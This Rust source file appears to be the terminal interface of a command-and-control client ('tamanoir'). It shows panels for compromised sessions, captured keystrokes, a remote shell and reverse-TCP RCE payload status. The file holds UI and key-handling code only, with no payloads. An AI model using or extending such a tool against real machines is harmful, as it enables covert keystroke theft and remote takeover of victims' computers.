pub mod keylogger;
pub mod session;
pub mod shell;

use std::fmt::Display;

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseEvent, MouseEventKind};
use ratatui::{
    layout::{Constraint, Direction, Layout, Margin, Rect},
    style::Stylize,
    text::{Line, Span, Text},
    widgets::Clear,
    Frame,
};
use shell::ShellCommandHistoryMap;

use crate::{
    app::{AppResult, SessionsMap},
    grpc::{RceServiceClient, RemoteShellServiceClient, SessionServiceClient},
    notification::NotificationSender,
    tamanoir_grpc::SessionResponse,
};

#[derive(Debug, PartialEq)]
pub enum FocusedSection {
    Sessions,
    KeyLogger,
    Shell,
    Rce,
}

#[derive(Debug)]
pub struct Sections {
    pub focused_section: FocusedSection,
    pub session_section: session::SessionSection,
    pub shell_percentage_split: Option<u16>,
    pub notification_sender: NotificationSender,
}

impl Sections {
    pub async fn new(
        shell_history_map: ShellCommandHistoryMap,
        sessions_map: SessionsMap,
        session_client: &mut SessionServiceClient,
        rce_client: &mut RceServiceClient,
        notification_sender: NotificationSender,
    ) -> AppResult<Self> {
        Ok(Self {
            focused_section: FocusedSection::Sessions,

            session_section: session::SessionSection::new(
                sessions_map,
                shell_history_map,
                session_client,
                rce_client,
                notification_sender.clone(),
            )
            .await?,
            shell_percentage_split: None,
            notification_sender,
        })
    }

    fn render_footer_help(&self, frame: &mut Frame, block: Rect) {
        let chunks = Layout::default()
            .direction(Direction::Horizontal)
            .constraints([Constraint::Min(1), Constraint::Fill(1), Constraint::Min(1)])
            .split(block.inner(Margin {
                horizontal: 2,
                vertical: 0,
            }));
        let base_message = if self.session_section.is_editing() {
            Vec::new()
        } else {
            vec![
                Span::from(" :").bold(),
                Span::from(" Nav"),
                Span::from(" | "),
                Span::from("Ctrl + s:").bold(),
                Span::from(" (Un)Toggle Shell"),
            ]
        };

        let contextual_msg = match self.focused_section {
            FocusedSection::Shell => {
                let mut msg = vec![
                    Span::from("󰘶 + :").bold().yellow(),
                    Span::from(" Resize shell").yellow(),
                    Span::from(" | "),
                    Span::from("Ctrl + :").bold().yellow(),
                    Span::from(" Scroll").yellow(),
                ];
                if self.session_section.shell.manual_scroll {
                    msg.extend([
                        Span::from(" | "),
                        Span::from("󱊷 :").bold().yellow(),
                        Span::from(" Exit scroll mode").yellow(),
                    ])
                }
                msg
            }
            FocusedSection::Sessions => {
                if self.session_section.is_editing() {
                    vec![
                        Span::from(" 󱊷 :").bold().yellow(),
                        Span::from(" Exit Edit Mode").yellow(),
                        Span::from(" | "),
                        Span::from(" :").bold().yellow(),
                        Span::from(" Switch Edit Section").yellow(),
                        Span::from(" | "),
                        Span::from("󰌑 :").bold().yellow(),
                        Span::from(" Apply").yellow(),
                    ]
                } else {
                    vec![
                        Span::from("󰌑 :").bold().yellow(),
                        Span::from(" Edit Mode").yellow(),
                    ]
                }
            }
            _ => Vec::new(),
        };
        frame.render_widget(
            Text::from(vec![Line::from(base_message)]).left_aligned(),
            chunks[0],
        );
        frame.render_widget(
            Text::from(vec![Line::from(contextual_msg)]).right_aligned(),
            chunks[2],
        );
    }

    fn shell_available(&self) -> bool {
        if let Some(session) = &self.session_section.selected_session {
            return session.get_shell_status() == ShellAvailablilityStatus::Connected;
        }
        false
    }
    pub fn render(&mut self, frame: &mut Frame) {
        let (main_block, help_block) = {
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .constraints([Constraint::Fill(1), Constraint::Length(1)])
                .split(frame.area());

            (chunks[0], chunks[1])
        };
        let (sessions_block, main_block) = {
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .constraints([Constraint::Length(7), Constraint::Fill(1)])
                .split(main_block);
            (chunks[0], chunks[1])
        };

        self.session_section.render(
            frame,
            sessions_block,
            self.focused_section == FocusedSection::Sessions,
        );

        self.render_footer_help(frame, help_block);

        let (keylogger_block, shell_block) = {
            match self.shell_percentage_split {
                Some(k) => {
                    let chunks = Layout::default()
                        .direction(Direction::Vertical)
                        .constraints([Constraint::Fill(1), Constraint::Percentage(k)])
                        .split(main_block);
                    (chunks[0], Some(chunks[1]))
                }
                None => {
                    let chunks = Layout::default()
                        .direction(Direction::Vertical)
                        .constraints([Constraint::Fill(1)])
                        .split(main_block);
                    (chunks[0], None)
                }
            }
        };
        keylogger::render(
            frame,
            keylogger_block,
            &mut self.session_section.selected_session,
            self.focused_section == FocusedSection::KeyLogger,
        );
        if let Some(shell_block) = shell_block {
            let selected_session_id =
                if let Some(session_id) = &self.session_section.selected_session {
                    session_id.ip.clone()
                } else {
                    "".into()
                };
            self.session_section.shell.render(
                frame,
                shell_block,
                self.focused_section == FocusedSection::Shell,
                selected_session_id,
                self.shell_available(),
            );
        }
        if self.focused_section == FocusedSection::Sessions && self.session_section.edition_mode {
            let popup_block = main_block;
            frame.render_widget(Clear, popup_block);

            self.session_section
                .render_session_edition(frame, popup_block);
        }
    }
    pub async fn handle_mouse(&mut self, mouse_event: MouseEvent) -> AppResult<()> {
        match mouse_event.kind {
            MouseEventKind::ScrollUp => match self.focused_section {
                FocusedSection::Shell if self.shell_available() => {
                    self.session_section.shell.scroll_up()
                }
                _ => {}
            },
            MouseEventKind::ScrollDown => match self.focused_section {
                FocusedSection::Shell if self.shell_available() => {
                    self.session_section.shell.scroll_down()
                }
                _ => {}
            },

            _ => {}
        }
        Ok(())
    }

    pub async fn handle_keys(
        &mut self,
        key_event: KeyEvent,
        shell_client: &mut RemoteShellServiceClient,
        session_client: &mut SessionServiceClient,
        rce_client: &mut RceServiceClient,
    ) -> AppResult<()> {
        match key_event.code {
            KeyCode::Tab => {
                if self.session_section.is_editing() {
                    self.session_section.next_edit_section()
                } else {
                    match self.focused_section {
                        FocusedSection::Sessions => {
                            self.focused_section = FocusedSection::KeyLogger
                        }
                        FocusedSection::KeyLogger => {
                            if self.shell_percentage_split.is_some() {
                                self.focused_section = FocusedSection::Shell
                            } else {
                                self.focused_section = FocusedSection::Sessions
                            }
                        }
                        FocusedSection::Shell => self.focused_section = FocusedSection::Sessions,
                        _ => {}
                    }
                }
            }
            KeyCode::BackTab => {
                if self.session_section.is_editing() {
                    self.session_section.previous_edit_section()
                } else {
                    match self.focused_section {
                        FocusedSection::KeyLogger => {
                            self.focused_section = FocusedSection::Sessions
                        }
                        FocusedSection::Shell => self.focused_section = FocusedSection::KeyLogger,
                        FocusedSection::Sessions => {
                            if self.shell_percentage_split.is_some() {
                                self.focused_section = FocusedSection::Shell
                            } else {
                                self.focused_section = FocusedSection::KeyLogger
                            }
                        }
                        _ => {}
                    }
                }
            }
            KeyCode::Char('s')
                if key_event.modifiers == KeyModifiers::CONTROL
                    && !self.session_section.is_editing() =>
            {
                if self.shell_percentage_split.is_some() {
                    self.shell_percentage_split = None;
                    if self.focused_section == FocusedSection::Shell {
                        self.focused_section = FocusedSection::Sessions;
                    }
                } else {
                    self.shell_percentage_split = Some(20);
                    self.focused_section = FocusedSection::Shell;
                }
            }
            KeyCode::Char('J') | KeyCode::Down
                if (key_event.modifiers == KeyModifiers::SHIFT
                    && self.focused_section == FocusedSection::Shell) =>
            {
                if let Some(split) = self.shell_percentage_split {
                    self.shell_percentage_split = Some(split.saturating_sub(5).max(20))
                };
            }
            KeyCode::Char('K') | KeyCode::Up
                if (key_event.modifiers == KeyModifiers::SHIFT
                    && self.focused_section == FocusedSection::Shell) =>
            {
                if let Some(split) = self.shell_percentage_split {
                    self.shell_percentage_split = Some((split + 5).min(90));
                }
            }

            _ => match self.focused_section {
                FocusedSection::Sessions => match key_event.code {
                    KeyCode::Char('j') | KeyCode::Down => self.session_section.next_item(),
                    KeyCode::Char('k') | KeyCode::Up => self.session_section.previous_item(),

                    KeyCode::Esc if self.session_section.is_editing() => {
                        self.session_section.edition_mode = false;
                    }
                    KeyCode::Enter
                        if self.session_section.selected_session.is_some()
                            && !self.session_section.is_editing() =>
                    {
                        self.session_section.edition_mode = true;
                    }
                    KeyCode::Enter if self.session_section.is_editing() => {
                        self.session_section
                            .apply_change(session_client, rce_client)
                            .await?;
                    }
                    _ => {}
                },
                FocusedSection::KeyLogger => {}
                FocusedSection::Shell if self.shell_available() => {
                    self.session_section
                        .shell
                        .handle_keys(
                            key_event,
                            shell_client,
                            rce_client,
                            self.session_section.selected_session.clone().unwrap().ip,
                        )
                        .await?;
                }

                _ => {}
            },
        }

        Ok(())
    }
}
#[derive(PartialEq)]
pub enum ShellAvailablilityStatus {
    NotSelectedForTransmission,
    Transmiting,
    Connected,
}

impl Display for ShellAvailablilityStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let msg = match self {
            Self::Connected => "Connected ",
            Self::Transmiting => "Waiting for tx to complete...",
            Self::NotSelectedForTransmission => "Unavailable",
        };
        write!(f, "{msg}")
    }
}

impl SessionResponse {
    fn get_shell_status(&self) -> ShellAvailablilityStatus {
        if self.shell_availability {
            ShellAvailablilityStatus::Connected
        } else {
            match &self.rce_payload {
                Some(rce_payload) => {
                    if rce_payload.name == "reverse-tcp" && rce_payload.buffer_length > 0 {
                        ShellAvailablilityStatus::Transmiting
                    } else {
                        ShellAvailablilityStatus::NotSelectedForTransmission
                    }
                }
                None => ShellAvailablilityStatus::NotSelectedForTransmission,
            }
        }
    }
}
